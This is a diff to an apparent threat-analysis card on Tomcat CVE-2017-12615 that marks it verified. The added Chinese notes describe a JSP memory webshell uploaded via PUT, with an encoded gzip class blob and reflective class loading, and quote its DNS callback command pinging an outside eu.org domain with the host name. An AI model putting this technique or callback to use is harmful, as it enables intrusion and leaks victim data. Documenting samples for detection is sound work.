@@ -26,9 +26,13 @@ cve:
 - CVE-2017-12615
 severity: high
 confidence: high
-status: draft
+status: verified
 created: '2026-11-07'
 updated: '2026-11-07'
+verification:
+  verified_by: verifier-V261
+  verified_at: '2026-11-07T18:05:29+08:00'
+  notes: 已对照原文与61张图核对：57/58图PUT /hello.jsp/上传变异马，58图源码含static context Map、b64Decode(H4sIA...)、GZIPInputStream unc()、反射ClassLoader#defineClass、context key='lgetwr'与equals(new Object[]{request,response})；59/60图提取H4sIA blob、jadx显示ThrowableDeserializer的P()=SjIHRC7oSVIE、K()=oszXCfTeXHpIkMS3、C()=9d127d56...；61图类内命令ping -c 1 Administrator.d5454c8975.ipv6.1433.eu.org.。KB版已把lgetwr明确为context key（任意请求触发，口令由P()提供），与源码一致。dedup：Unsafe.defineAnonymousClass、注册内存Servlet、Spring动态Controller等类加载马加载/注册方式不同；本卡为内嵌GZIP blob+反射defineClass+DNS回显，非同一链。未验证点：未执行该马或复跑PoC；H4sIA blob为文章中样本，已核对特征前缀。
 ---
 
 ## 一句话结论
